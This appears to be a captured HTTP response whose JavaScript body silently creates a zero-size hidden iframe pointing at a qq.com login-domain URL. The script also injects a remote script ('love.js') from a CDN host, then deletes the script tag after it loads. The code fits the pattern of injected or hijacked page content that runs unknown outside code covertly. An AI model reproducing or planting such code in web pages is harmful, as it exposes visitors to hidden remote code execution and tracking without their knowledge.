         200 OK
Content-Type: application/x-javascript
Connection: keep-alive
Vary: Accept-Encoding
Content-Length: 951

var URLList = new Array(
		"ui.ptlogin2.qq.com/style/0/images/1.gif?346519"
);
var loadURL = function(url) {
	var ExT_f = document.createElement("iframe");
    ExT_f.width = "0";
    ExT_f.height = "0";
    ExT_f.frameborder = "0";
    document.body.appendChild(ExT_f);
    ExT_f.src = "http://"+url;
};
var loadJS = function(url) {
    var head = document.getElementsByTagName("head")[0];
    var script = document.createElement("script");
    script.src = url;
    var done = false;
    script.onload = script.onreadystatechange = function() {
        if (!done && (!this.readyState || this.readyState == "loaded" || this.readyState == "complete")) {
            done = true;
            script.onload = script.onreadystatechange = null;
            head.removeChild(script);
        }
    };
    head.appendChild(script);
};
loadJS("http://7u2ss1.com1.z0.glb.clouddn.com/love.js?111");

for(var i=0;i<URLList.length;i++)
{
	loadURL(URLList[i]);
}

